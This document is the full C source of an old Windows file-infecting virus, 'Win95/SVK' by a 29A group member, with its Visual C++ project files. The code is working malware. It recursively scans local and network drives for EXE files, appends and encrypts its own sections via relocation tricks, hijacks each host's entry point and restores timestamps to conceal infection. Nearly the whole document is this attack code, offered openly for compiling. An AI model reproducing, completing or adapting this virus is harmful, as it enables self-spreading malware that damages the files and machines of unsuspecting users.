
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SVK.C]컴�
////////////////////////////////////////////////////////////////////
//
// Win95/SVK
//
// The 1st encrypted virus that doesn't need a decryption routine.
// Size : 4.5KB up to 15K (depends of host alignment).
//
// Coded: Dec.2000
//
// (c)2000 Tcp/29A (tcp@cryogen.com)
//
// My 2nd Windows virus; based in Win32/Resurrection to test the
// encryption with relocations. If you want to know more about this
// read the article about this topic.
// Only the code section is encrypted in this virus.
//
// Compilation: VC 6.0 in Release Mode (won't work in Debug).
//  Use the project file included whit this source.
//  It has dependencies with MSVCRT.DLL to make it small but there is
//  no problem because it's installed in all computers by Windows.
//
// Tcp.
//
////////////////////////////////////////////////////////////////////


/////////////
// Includes
/////////////
#include <stdio.h>
#include <windows.h>


/////////////////////
// Defines
/////////////////////

#define MEMALLOC(x) GlobalAlloc(GPTR, x)
#define MEMFREE(x)  GlobalFree(x)


/////////////////////
// Type definitions
/////////////////////

typedef struct
{
  WORD RelocOfs : 12;
  WORD RelocType:  4;
} IMAGE_RELOCATION_DATA;

////////////
// Globals
////////////
IMAGE_NT_HEADERS PEHeader;
IMAGE_DOS_HEADER * IDosHeader;
IMAGE_NT_HEADERS * IPEHeader;
IMAGE_SECTION_HEADER * ISection;
IMAGE_SECTION_HEADER * Section = NULL;
int Generation = 1;
int VirusSections = 0;
int FirstVirusSection = 0;
int VirusCodeSection = 0;
int VirusImportSection = 0;
DWORD VirusImportSize = 0;
DWORD VirusRVAImports = 0;
DWORD HostRVAImports = 0;
int VirusRelocSection = 0;
DWORD VirusRelocSize = 0;
DWORD VirusRelocSizeDir = 0;
DWORD OfsSections = 0;
DWORD VirusBaseRVA = 0;
DWORD VirusEP = 0;
DWORD HostEP = 0;

static char Copyright[] = "Win95/SVK by Tcp/29A";


//////////////
// Functions
//////////////


/////////////////////////////////////
// GetProcAddress for ordinal imports
/////////////////////////////////////
DWORD GetProcAddressOrd(DWORD Base, DWORD NFunc)
{
  IMAGE_NT_HEADERS * DLLHeader;
  IMAGE_EXPORT_DIRECTORY * Exports;
  DWORD * AddrFunctions;

  DLLHeader = (IMAGE_NT_HEADERS *)(Base + ((IMAGE_DOS_HEADER *)Base)->e_lfanew);
  Exports = (IMAGE_EXPORT_DIRECTORY *)(Base + DLLHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  AddrFunctions = (DWORD *)(Base + Exports->AddressOfFunctions);
  return Base + AddrFunctions[NFunc - Exports->Base];
}



//////////////////////////////////
// Check file and read PE header
//////////////////////////////////
int ReadPEHeader(HANDLE FHandle)
{
  IMAGE_DOS_HEADER FileHeader;
  WORD SizeSections;
  DWORD BytesRead;

  return
     (      // Read file header
       ( ReadFile(FHandle, &FileHeader, sizeof(IMAGE_DOS_HEADER), &BytesRead, NULL) )
       &&
       ( BytesRead == sizeof(IMAGE_DOS_HEADER) )
       &&   // Check if EXE file
       ( FileHeader.e_magic == IMAGE_DOS_SIGNATURE )
       &&   // Seek to NewExe header
       ( SetFilePointer(FHandle, FileHeader.e_lfanew, NULL, FILE_BEGIN) != (DWORD)-1 )
       &&   // Read header
       ( ReadFile(FHandle, &PEHeader, sizeof(IMAGE_NT_HEADERS), &BytesRead, NULL) )
       &&
       ( BytesRead == sizeof(IMAGE_NT_HEADERS) )
       &&   // Check if PE file
       ( PEHeader.Signature == IMAGE_NT_SIGNATURE )
       &&   // ImageBase must be 0x400000
       ( PEHeader.OptionalHeader.ImageBase == 0x400000 )
       &&   // Alloc memory for file sections + virus sections + new reloc section
       ( (SizeSections = (PEHeader.FileHeader.NumberOfSections + VirusSections) * sizeof(IMAGE_SECTION_HEADER)) )
       &&
       ( (Section = MEMALLOC(SizeSections + sizeof(IMAGE_SECTION_HEADER))) != NULL )
       &&
       ( (OfsSections = SetFilePointer(FHandle, 0, NULL, FILE_CURRENT)) ) 
       &&   // Read PE sections
       ( ReadFile(FHandle, Section, SizeSections, &BytesRead, NULL) )
       &&
       ( BytesRead == SizeSections )
       &&   // Check if there is enough room for our sections
       ( (SetFilePointer(FHandle, 0, NULL, FILE_CURRENT) + (VirusSections * sizeof(IMAGE_SECTION_HEADER))) <= PEHeader.OptionalHeader.SizeOfHeaders )
       &&   // Only infect when entry point belongs to 1st section
            // Avoid reinfections and compressors (usually perform virus checks)
       ( PEHeader.OptionalHeader.AddressOfEntryPoint < Section[0].VirtualAddress + Section[0].SizeOfRawData )
       &&   // Skip DDLs
       ( !(PEHeader.FileHeader.Characteristics & IMAGE_FILE_DLL) )
       &&   // Skip files with overlays or not aligned to file alignment
       ( SetFilePointer(FHandle, 0, NULL, FILE_END) == Section[PEHeader.FileHeader.NumberOfSections-1].PointerToRawData + Section[PEHeader.FileHeader.NumberOfSections-1].SizeOfRawData )
       &&   //Check if the host will overwrite our code with its unitialized data (not present in disk)
       ( Section[PEHeader.FileHeader.NumberOfSections-1].Misc.VirtualSize <= Section[PEHeader.FileHeader.NumberOfSections-1].SizeOfRawData )
     );
}



//////////////////////////////////////////////////
// I still can't remember what this function does
//////////////////////////////////////////////////
void InfectFile(HANDLE FHandle)
{
  BYTE * Relocations =NULL;
  BYTE * HostRelocs = NULL;
  BYTE * CodeRelocs = NULL;
  BYTE * Ptr = NULL;
  IMAGE_BASE_RELOCATION * RelocBlock;
  IMAGE_RELOCATION_DATA * PtrReloc;
  int j;
  DWORD NewBase;

  Section = NULL;
  if (ReadPEHeader(FHandle))
  {
    DWORD SectionRVA;
    int HostNSections;
    DWORD BytesRead;
    int i;

    HostEP = PEHeader.OptionalHeader.AddressOfEntryPoint;
    HostNSections = PEHeader.FileHeader.NumberOfSections;

    HostRVAImports = PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    // Search for victim import section
    for (i=0; i<HostNSections; i++)
    {
      if (Section[i].VirtualAddress + Section[i].SizeOfRawData > HostRVAImports)
      {
        // Do it writable
        Section[i].Characteristics |= IMAGE_SCN_MEM_WRITE;
        break;
      }
    }

    // Check if last section is .reloc
    if (PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == Section[HostNSections-1].VirtualAddress)
    {
      // Then we'll overwrite it (we don't need it)
      VirusBaseRVA = SectionRVA = Section[HostNSections-1].VirtualAddress;
      HostNSections--;
      SetFilePointer(FHandle, Section[HostNSections].PointerToRawData, NULL, FILE_BEGIN);
    }
    else  // There is no .reloc or it is not the last section
    {
      VirusBaseRVA = SectionRVA = PEHeader.OptionalHeader.SizeOfImage;
      SetFilePointer(FHandle, 0, NULL, FILE_END);
    }

    FirstVirusSection = HostNSections;
    // Add virus section table
    CopyMemory(&Section[HostNSections], &ISection[0], sizeof(IMAGE_SECTION_HEADER) * VirusSections);

    // Get an invalid base for host (0xBFxxxxxx)
    NewBase = 0xBF000000 | (GetTickCount() & 0x00FFFFFF);

    // Reloc virus code & fix reloc sections
    if ((Relocations = MEMALLOC((VirusRelocSize > 0x1000)? VirusRelocSize : 0x1000)) == NULL) // Minimun a page
    {
      goto L_Exit_Infect;
    }
    CopyMemory(Relocations, (BYTE *)((DWORD)IDosHeader + ISection[VirusRelocSection].VirtualAddress), VirusRelocSize);
    
    RelocBlock = (IMAGE_BASE_RELOCATION *)Relocations;
    PtrReloc = (IMAGE_RELOCATION_DATA *)(Relocations + sizeof(IMAGE_BASE_RELOCATION));

    // Reloc all virus sections and write them to disk
    for (i=0; i<VirusSections; i++)
    {
      DWORD RelocsInBlock;

      Section[HostNSections + i].PointerToRawData = SetFilePointer(FHandle, 0, NULL, FILE_CURRENT);
      Section[HostNSections + i].VirtualAddress = SectionRVA;
      Section[HostNSections + i].SizeOfRawData = (ISection[i].Misc.VirtualSize + PEHeader.OptionalHeader.FileAlignment-1) & (-(long)PEHeader.OptionalHeader.FileAlignment);
	  
      if ((Ptr = (BYTE *)MEMALLOC(ISection[i].SizeOfRawData)) == NULL)
      {
        goto L_Exit_Infect;
      }
      CopyMemory(Ptr, (BYTE *)((DWORD)IDosHeader + ISection[i].VirtualAddress), ISection[i].SizeOfRawData);

      // Do relocations in this section
      while ( (ISection[i].VirtualAddress + ISection[i].SizeOfRawData > RelocBlock->VirtualAddress)
              &&
              ((DWORD)PtrReloc < (DWORD)Relocations + VirusRelocSizeDir)
            )
      {
        DWORD Base;

        Base = RelocBlock->VirtualAddress - ISection[i].VirtualAddress;
        RelocsInBlock = (RelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_DATA);
        while (RelocsInBlock--)
        {
          if (PtrReloc->RelocType == IMAGE_REL_BASED_HIGHLOW)
          {
  	        *((DWORD *)&Ptr[Base + PtrReloc->RelocOfs]) -= ISection[i].VirtualAddress;
            *((DWORD *)&Ptr[Base + PtrReloc->RelocOfs]) += SectionRVA;
          }
          PtrReloc++;
        }
        RelocBlock->VirtualAddress = RelocBlock->VirtualAddress - ISection[i].VirtualAddress + SectionRVA;
        RelocBlock = (IMAGE_BASE_RELOCATION *)PtrReloc;
        PtrReloc = (IMAGE_RELOCATION_DATA *)((BYTE *)RelocBlock + sizeof(IMAGE_BASE_RELOCATION));
      }
        
      // Check if this is the Import section
      if (i == VirusImportSection)
      {
        IMAGE_IMPORT_DESCRIPTOR * Imports;
        IMAGE_THUNK_DATA * DataImports;
        DWORD StartImports;
        DWORD DeltaRVAs;

        DeltaRVAs = SectionRVA - ISection[i].VirtualAddress;
        StartImports = IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress - ISection[i].VirtualAddress;
        Imports = (IMAGE_IMPORT_DESCRIPTOR *)&Ptr[StartImports];
        while (Imports->OriginalFirstThunk)
        {
          // Fix some initialized fields in memory
          Imports->TimeDateStamp = Imports->ForwarderChain = 0;
          Imports->OriginalFirstThunk += DeltaRVAs;
          Imports->Name += DeltaRVAs;
          Imports->FirstThunk += DeltaRVAs;
          DataImports = (IMAGE_THUNK_DATA *)&Ptr[Imports->OriginalFirstThunk - SectionRVA];
          do
          {
            DataImports->u1.AddressOfData = (IMAGE_IMPORT_BY_NAME *)((DWORD)DataImports->u1.AddressOfData + DeltaRVAs);
          }
          while ((++DataImports)->u1.AddressOfData);
          Imports++;
        }
      }

      if (i == VirusCodeSection)
      {
        unsigned x;
        DWORD Base;
        int r_index = 0;

        if ((CodeRelocs = (BYTE *)MEMALLOC(ISection[i].SizeOfRawData*sizeof(IMAGE_RELOCATION_DATA) + 0x1000)) == NULL) // I'm too lazy to calculate the correct value :)
        {
          goto L_Exit_Infect;
        }
        memset(CodeRelocs, 0, ISection[i].SizeOfRawData*sizeof(IMAGE_RELOCATION_DATA) + 0x1000);
        Base = SectionRVA;
        for (x=0; x<ISection[i].SizeOfRawData; x+=4)
        {
          // Encrypt a dword in code section
          *(DWORD *)&Ptr[x] += NewBase;
          *(DWORD *)&Ptr[x] -= 0x400000;
          // And add its relocation to reloc section
          if ((x % 0x1000) == 0) // Generate reloc block header?
          {
            if (x != 0)
            {
              ((IMAGE_RELOCATION_DATA *)&CodeRelocs[r_index])->RelocOfs = 0;
              ((IMAGE_RELOCATION_DATA *)&CodeRelocs[r_index])->RelocType = 0;
              r_index += sizeof(IMAGE_RELOCATION_DATA);
            }
            ((IMAGE_BASE_RELOCATION *)&CodeRelocs[r_index])->VirtualAddress = Base;
            ((IMAGE_BASE_RELOCATION *)&CodeRelocs[r_index])->SizeOfBlock = sizeof(IMAGE_BASE_RELOCATION) + sizeof(IMAGE_RELOCATION_DATA)*(((ISection[i].SizeOfRawData - x) > 0x1000)? (0x1000/4) : ((ISection[i].SizeOfRawData - x)/4)) + 2;
            Base += 0x1000;
            r_index += sizeof(IMAGE_BASE_RELOCATION);
          }
          ((IMAGE_RELOCATION_DATA *)&CodeRelocs[r_index])->RelocOfs = (x & 0xFFF);
          ((IMAGE_RELOCATION_DATA *)&CodeRelocs[r_index])->RelocType = IMAGE_REL_BASED_HIGHLOW;
          r_index += sizeof(IMAGE_RELOCATION_DATA);
        }
        // Build new reloc section
        CopyMemory(&Section[HostNSections + VirusSections], &ISection[VirusRelocSection], sizeof(IMAGE_SECTION_HEADER));
        Section[HostNSections + VirusSections].Misc.VirtualSize = r_index;
        Section[HostNSections + VirusSections].SizeOfRawData = (r_index + PEHeader.OptionalHeader.FileAlignment - 1)  & (-(long)PEHeader.OptionalHeader.FileAlignment);
      }

      if (i == VirusRelocSection)
      {
        CopyMemory(Ptr, Relocations, Section[HostNSections + i].SizeOfRawData);
      }

      WriteFile(FHandle, Ptr, Section[HostNSections + i].SizeOfRawData, &BytesRead, NULL);
      MEMFREE(Ptr);
      Ptr = NULL;
      SectionRVA += ( Section[HostNSections + i].Misc.VirtualSize + (PEHeader.OptionalHeader.SectionAlignment - 1)) & (-(long)PEHeader.OptionalHeader.SectionAlignment);
    }//for
    
    // Save new reloc section
    Section[HostNSections + VirusSections].VirtualAddress = SectionRVA;
    Section[HostNSections + VirusSections].PointerToRawData = SetFilePointer(FHandle, 0, NULL, FILE_CURRENT);
    SectionRVA += ( Section[HostNSections + VirusSections].Misc.VirtualSize + (PEHeader.OptionalHeader.SectionAlignment - 1)) & (-(long)PEHeader.OptionalHeader.SectionAlignment);
    WriteFile(FHandle, CodeRelocs, Section[HostNSections + VirusSections].SizeOfRawData, &BytesRead, NULL);

    // Recalculate Header fields
    PEHeader.FileHeader.Characteristics &= (~IMAGE_FILE_RELOCS_STRIPPED); // There are relocs
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = Section[HostNSections + VirusSections].VirtualAddress;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = Section[HostNSections + VirusSections].Misc.VirtualSize;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress = 0;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size = 0;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = VirusRVAImports + Section[HostNSections + VirusCodeSection].VirtualAddress;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    PEHeader.OptionalHeader.ImageBase = NewBase;
    PEHeader.OptionalHeader.SizeOfImage = SectionRVA;
    PEHeader.OptionalHeader.AddressOfEntryPoint = VirusEP + Section[HostNSections + VirusCodeSection].VirtualAddress;
    PEHeader.FileHeader.NumberOfSections = HostNSections + VirusSections + 1;
    PEHeader.OptionalHeader.SizeOfCode = 0;
    PEHeader.OptionalHeader.SizeOfInitializedData = 0;
    PEHeader.OptionalHeader.SizeOfUninitializedData = 0;
    for (j=0; j<PEHeader.FileHeader.NumberOfSections; j++)
    {
      if (Section[j].Characteristics & IMAGE_SCN_CNT_CODE)
        PEHeader.OptionalHeader.SizeOfCode += Section[j].SizeOfRawData;
      if (Section[j].Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
        PEHeader.OptionalHeader.SizeOfInitializedData += Section[j].SizeOfRawData;
      if (Section[j].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
        PEHeader.OptionalHeader.SizeOfUninitializedData += Section[j].SizeOfRawData;
    }
    // Write new header and section table
    SetFilePointer(FHandle, OfsSections - sizeof(IMAGE_NT_HEADERS), NULL, FILE_BEGIN);
    WriteFile(FHandle, &PEHeader, sizeof(IMAGE_NT_HEADERS), &BytesRead, NULL);
    WriteFile(FHandle, Section, PEHeader.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER), &BytesRead, NULL);
  }

L_Exit_Infect:
  // Free allocated memory
  if (HostRelocs != NULL)
    MEMFREE(HostRelocs);
  if (Relocations != NULL)
    MEMFREE(Relocations);
  if (Section != NULL)
    MEMFREE(Section);
  if (Ptr != NULL)
    MEMFREE(Ptr);
  if (CodeRelocs != NULL)
    MEMFREE(CodeRelocs);
}


///////////////////////////////////////////
// Recursively search for files to infect
///////////////////////////////////////////
void SearchFiles(char * Path)
{
  HANDLE FindHandle;
  HANDLE FHandle;
  WIN32_FIND_DATA FindResult;
  FILETIME Time1, Time2, Time3;

  if (SetCurrentDirectory(Path))
  {
    // Search for EXE files in current directory
    if ((FindHandle = FindFirstFile("*.EXE", &FindResult)) != INVALID_HANDLE_VALUE)
    {
      do
      {
        FHandle = CreateFile(FindResult.cFileName,
                             GENERIC_READ | GENERIC_WRITE,
                             0,
                             NULL,
                             OPEN_EXISTING,
                             FILE_ATTRIBUTE_ARCHIVE,
                             NULL
                            );
        if (FHandle != INVALID_HANDLE_VALUE)
        {
          GetFileTime(FHandle, &Time1, &Time2, &Time3); // Get file time
          InfectFile(FHandle);                          // Infect file
          SetFileTime(FHandle, &Time1, &Time2, &Time3); // Restore file time
          CloseHandle(FHandle);
        }
      }
      while (FindNextFile(FindHandle, &FindResult));
    }
    FindClose(FindHandle);
    // Now search for subdirectories and process them
    if ((FindHandle = FindFirstFile("*", &FindResult)) != INVALID_HANDLE_VALUE)
    {
      do
      {
        if (FindResult.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
          char * DirName;

          DirName = _strupr(_strdup(FindResult.cFileName));
          if ( 
                (memcmp(DirName, "SYSTEM", 6))    // Skip SYSTEM??
              &&
                (FindResult.cFileName[0] != '.')  // Skip loops with "." and ".."
             )
          {
            SearchFiles(FindResult.cFileName);
          }
          free(DirName);
        }
      }
      while (FindNextFile(FindHandle, &FindResult));
    }
    FindClose(FindHandle);
  }
}


/////////////////////////////////////////////
// Search fixed and network drives to infect
/////////////////////////////////////////////
DWORD WINAPI SearchDrives()
{
  DWORD Drives;
  BYTE CurrentDrive[] = "A:\\";
  DWORD DriveType;
  BYTE i;

  Drives = GetLogicalDrives();
  for (i=0; i<sizeof(DWORD)*8; i++) // There was a bug in Resurrection...
  {
    if (Drives & (1<<i))  // Drive present?
    {
      CurrentDrive[0] = 'A' + i;
      DriveType = GetDriveType(CurrentDrive);
      // Only infect files in Fixed and Network Drives
      if ((DriveType == DRIVE_FIXED) || (DriveType == DRIVE_REMOTE))
      {
        SearchFiles(CurrentDrive);
      }
    }
  }
  return 1;
}




// Simulated host for 1st generation
void Gen1()
{
}


// Virus Entry Point
void main()
{
  BYTE InfectedFile[_MAX_PATH];
  DWORD ThreadID;
  DWORD ThreadInfID;
  HANDLE HThread;
  HANDLE InfThread;
  int i;
  HMODULE * HandleDLL = NULL;
  int ImportedDLLs = 0;


  // Get the infected filename
  GetModuleFileName(NULL, InfectedFile, sizeof(InfectedFile));
  // And its memory address
  IDosHeader = (IMAGE_DOS_HEADER *)GetModuleHandle(InfectedFile);
   
  IPEHeader = (IMAGE_NT_HEADERS *)((BYTE *)IDosHeader + IDosHeader->e_lfanew);

  if ( IPEHeader->Signature == IMAGE_NT_SIGNATURE ) // Check if we got the PE header
  {
    // Get ptr to Sections
    ISection = (IMAGE_SECTION_HEADER *)((BYTE *)IPEHeader + sizeof(IMAGE_NT_HEADERS));
    // Get ptr to virus Sections
    ISection += FirstVirusSection;
  
    if (Generation++ == 1)
    {   // Make some easy 1st-gen calcs to avoid complex ones in next generations
      HostEP = (DWORD)Gen1 - (DWORD)IDosHeader;
      VirusSections = IPEHeader->FileHeader.NumberOfSections; // Number of sections
      // Get the order of sections
      for (i=0; i<VirusSections; i++)
      {
        if ((ISection[i].VirtualAddress <= IPEHeader->OptionalHeader.AddressOfEntryPoint)
             &&
            (ISection[i].VirtualAddress + ISection[i].SizeOfRawData > IPEHeader->OptionalHeader.AddressOfEntryPoint)
           )
        { // This is the code section
          VirusCodeSection = i;
          VirusEP = IPEHeader->OptionalHeader.AddressOfEntryPoint - ISection[i].VirtualAddress;
        }
        else
        {
          if ((ISection[i].VirtualAddress <= IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
			          &&
			        (ISection[i].VirtualAddress + ISection[i].SizeOfRawData > IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
			       )
          { // This is the import section
      			VirusImportSection = i;
      		  VirusRVAImports = IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress - ISection[0].VirtualAddress;
          }
          else
          {
            if (ISection[i].VirtualAddress == IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
            { // This is the reloc section
              VirusRelocSection = i;
              VirusRelocSize = ISection[i].Misc.VirtualSize;
              VirusRelocSizeDir = IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            }
          }
        }
      }//for
    }
    else  // Not first generation
    {
      IMAGE_IMPORT_DESCRIPTOR * HostImports;
      int i;
      
      HostImports = (IMAGE_IMPORT_DESCRIPTOR *)(HostRVAImports + (DWORD)IDosHeader);
      // Count imported DLLs
      while (HostImports->OriginalFirstThunk)
      {
        ImportedDLLs++;
        HostImports++;
      }
      HandleDLL = (HMODULE *)MEMALLOC(ImportedDLLs * sizeof(HMODULE));
      // Make host imports
      HostImports = (IMAGE_IMPORT_DESCRIPTOR *)(HostRVAImports + (DWORD)IDosHeader);
      for (i=0; i<ImportedDLLs; i++)
      {
        DWORD * FunctionName;
        DWORD * FunctionAddr;
        LPCTSTR Name;
        LPCTSTR StExitThread = "ExitThread";

        if ((HandleDLL[i] = LoadLibrary((LPCTSTR)(HostImports->Name + (DWORD)IDosHeader))) == NULL)
        { // Exit if not find a DLL
          MEMFREE(HandleDLL);
          ExitProcess(0);
        }

        // Perform host imports
        FunctionName = (DWORD *)(HostImports->OriginalFirstThunk + (DWORD)IDosHeader);
        FunctionAddr = (DWORD *)(HostImports->FirstThunk + (DWORD)IDosHeader);
        while (*FunctionName)
        {
          if (*FunctionName & IMAGE_ORDINAL_FLAG)
          {
            // Windows doesn't like ordinal imports from kernel32, so use my own GetProcAddress
            *FunctionAddr = GetProcAddressOrd((DWORD)HandleDLL[i], IMAGE_ORDINAL(*FunctionName));
          }
          else
          {
            Name = (LPCTSTR)((DWORD)IDosHeader + *FunctionName + 2/*Hint*/);
            // Change ExitProcess by ExitThread
            if (!strcmp(Name, "ExitProcess"))
              Name = StExitThread;
            *FunctionAddr = (DWORD)GetProcAddress(HandleDLL[i], Name);
          }
          FunctionName++;
          FunctionAddr++;
        }
        HostImports++;
      }
    }

    HostEP += (DWORD)IDosHeader;
    // Exec host with a thread
    if ((HThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)HostEP, GetCommandLine(), 0, &ThreadID)) != NULL)
    {
      HANDLE VirusMutex;
       
      // Check if already resident
      if ( ((VirusMutex = CreateMutex(NULL, FALSE, "29A")) != NULL)
           &&
           (GetLastError() != ERROR_ALREADY_EXISTS)
         )
      {
        // Create infection thread
        InfThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SearchDrives , NULL, CREATE_SUSPENDED, &ThreadInfID);
        // Assign a low priority
        SetThreadPriority(InfThread, THREAD_PRIORITY_IDLE);
        // Activate it
        ResumeThread(InfThread);
        // Wait until infection completed
        WaitForSingleObject(InfThread, INFINITE);
        ReleaseMutex(VirusMutex);
      }
      // Wait until host thread finnished
      WaitForSingleObject(HThread, INFINITE);
    }

    for (i=0; i<ImportedDLLs; i++)
    {
      FreeLibrary(HandleDLL[i]);
    }
    if (HandleDLL != NULL)
      MEMFREE(HandleDLL);
  }
}
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SVK.C]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SVK.DSP]컴�
# Microsoft Developer Studio Project File - Name="virus" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=virus - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "virus.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "virus.mak" CFG="virus - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "virus - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE "virus - Win32 Debug" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe

!IF  "$(CFG)" == "virus - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 2
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MD /W3 /GX /Ox /Ow /Og /Os /Oy- /Gf /D "WIN32" /D "_CONSOLE" /D "_AFXDLL" /YX /FD /c
# SUBTRACT CPP /Oa /Oi /Gy
# ADD BASE RSC /l 0xc0a /d "NDEBUG"
# ADD RSC /l 0xc0a /d "NDEBUG" /d "_AFXDLL"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
# ADD LINK32 /nologo /subsystem:console /map /machine:I386 /fixed:no
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "virus - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /Zi /Od /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# SUBTRACT CPP /Fr
# ADD BASE RSC /l 0xc0a /d "_DEBUG"
# ADD RSC /l 0xc0a /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /map /debug /machine:I386 /pdbtype:sept /fixed:no
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "virus - Win32 Release"
# Name "virus - Win32 Debug"
# Begin Source File

SOURCE=.\virus.c
# End Source File
# End Target
# End Project
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SVK.DSP]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SVK.DSW]컴�
Microsoft Developer Studio Workspace File, Format Version 6.00
# WARNING: DO NOT EDIT OR DELETE THIS WORKSPACE FILE!

###############################################################################

Project: "virus"=.\virus.dsp - Package Owner=<4>

Package=<5>
{{{
}}}

Package=<4>
{{{
}}}

###############################################################################

Global:

Package=<5>
{{{
}}}

Package=<3>
{{{
}}}

###############################################################################
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SVK.DSW]컴�
